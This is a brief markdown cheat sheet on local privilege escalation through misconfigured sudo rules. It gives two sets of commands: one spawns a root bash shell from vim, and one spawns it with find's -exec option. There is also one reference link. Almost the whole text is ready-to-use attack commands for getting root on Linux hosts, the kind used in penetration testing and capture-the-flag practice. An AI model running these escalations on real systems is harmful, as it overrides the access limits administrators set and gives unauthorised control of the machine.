# Restricted Sudo: Privilege Escalation

1. If sudo allows **vim**

        sudo -l
        sudo vim <target_filename>
        :!/bin/bash

2. If sudo allows **find**

        sudo -l
        sudo find / -exec /bin/bash \;

## References

* https://linuxaria.com/howto/linux-shell-how-to-use-the-exec-option-in-find-with-examples